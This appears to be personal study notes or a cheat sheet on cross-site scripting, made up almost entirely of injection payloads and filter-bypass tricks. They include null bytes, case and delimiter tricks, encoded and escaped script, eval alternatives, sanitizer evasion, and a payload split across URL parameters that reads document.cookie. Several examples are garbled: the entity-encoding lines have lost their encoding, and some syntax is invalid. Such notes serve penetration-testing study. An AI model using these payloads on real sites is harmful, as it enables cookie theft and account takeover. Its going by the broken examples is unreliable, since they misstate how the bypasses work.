1. every input/params should be tested
2. 4 ways to induce XSS:
    1. Script tags:
        1. <object data=”data:text/html,<script>alert(1)</script>”>
        2. <object data=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”
        3. <a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”> Click here</a>
    2. Event Handlers:
        1. On“event listeners”=alert(1)
    3. Script Pseudo Protocols:
        1. When you are executing javascript directly from URL or action:
        2. <object data=javascript:alert(1)>
        3. <iframe src=javascript:alert(1)>
        4. <embed href=javascript:alert(1)>
        5. <button form=test formaction=javascript:alert(1)>
        6. <event-source src=javascript:alert(1)>
    4. Dynamically Evaulated Styles:
        1. try to search for this more recently cause many browser blocked it
3. Bypassing Filters
    1. HTML:
        1. tag name:
            
            1. Varying the Case of letters to capital/small:
                1. <iMg src=0 onerror=alert(1)>
            2. Insert Null bytes at any position:
                1. <[%00]img onerror=alert(1) src=a>
                2. <i[%00]mg onerror=alert(1) src=a>
            
            3.arbitrary tag :
            
            1. <x onclick=alert(1) src=a>click here</x>
            2. space following tag name:
                1. <img/onerror=alert(1) src=a>
                2. <img[%09]onerror=alert(1) src=a>
                3. <img[%0d]onerror=alert(1) src=a>
                4. <img[%0a]onerror=alert(1) src=a>
                5. <img/”onerror=alert(1) src=a>
                6. <img/’onerror=alert(1) src=a>
                7. <img/anyjunk/onerror=alert(1) src=a>
            3. attribute name:
                1. you can you same NULL byte trick :
                    1. <[%00]img onerror=alert(1) src=a>
            4. attribute delimiters:
                1. you need space after the value of att to indicate its end, This value can be replaced as following:
                    1. <img onerror=”alert(1)”src=a>
                    2. <img onerror=’alert(1)’src=a>
                    3. <img onerror=`alert(1)`src=a>
            5. if event-handlers are blocked:
                1. some browsers dont consider backticks` as delimiters so you can use em to join eventlisteners:
                2. <img src=`a`onerror=alert(1)>
            6. attribute values :
                1. NULL BYTE TRICK
                2. you can HTML-encode the value , as browser decodes the value before processing it
                3. you can use DECIMAL and HEXDECIMAL to trick filters by increase/decrease leading zeros:
                    1. <img onerror=alert(1) src=a>
                    2. <img onerror=alert(1) src=a>
                    3. <img onerror=alert(1) src=a>
    2. Script Codes:
        1. unicode escapes:
            1. <script>a\u006cert(1);</script>
        2. eval—> with eval you can use unicode, hexadecimal, octal:
            1. <script>eval(‘a\u006cert(1)’);</script>
            2. <script>eval(‘a\x6cert(1)’);</script>
            3. <script>eval(‘a\154ert(1)’);</script>
        3. unnecesssary escape characters:
            1. js ignores unnecessary escape characters
        4. Dynamically constructing string:
            1. <script>eval(‘al’+’ert(1)’);</script?
            2. <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
            3. <script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
                1. atob decode base64 string
        5. Alternatives to eval:
            1. <script>’alert(1)’.replace(/.+/,eval)</script>
            2. <script>function::[‘alert’](1)</script>
    3. Sanitization:
        1. check if sanitization occur on first occurence or global:
            1. <script><script>alert(1)</script>
                
            2. <<script>alert(1)</script>
                
            3. <scr<script>ipt>alert(1)</script>
                
            4. if you are injecting in script and ‘ is being sanitized by \ “
                
                1. you can \ before the input if its not being escaped so the input will be \’alert(1);
                    
                    result=etc\\’alert(1);//
                    
            5. If you are injecting into script but qoutation marks being escaped , you can use:
                
                1. String.fromCharCode :
                2. HTML entity encodings (some browser html decode event handlers before execute)
            6. if there is length limit :
                
                1. you cant inject any payload with this length and there are multiple inputs,
                2. you can ditribute your payload over the inputs:
                    1. [https://myapp.com/account.php?page_id=”](https://myapp.com/account.php?page_id=%E2%80%9D)><script>/_&seed=_/alert(document .cookie);/_&mode=_/</script>
    4. Change request method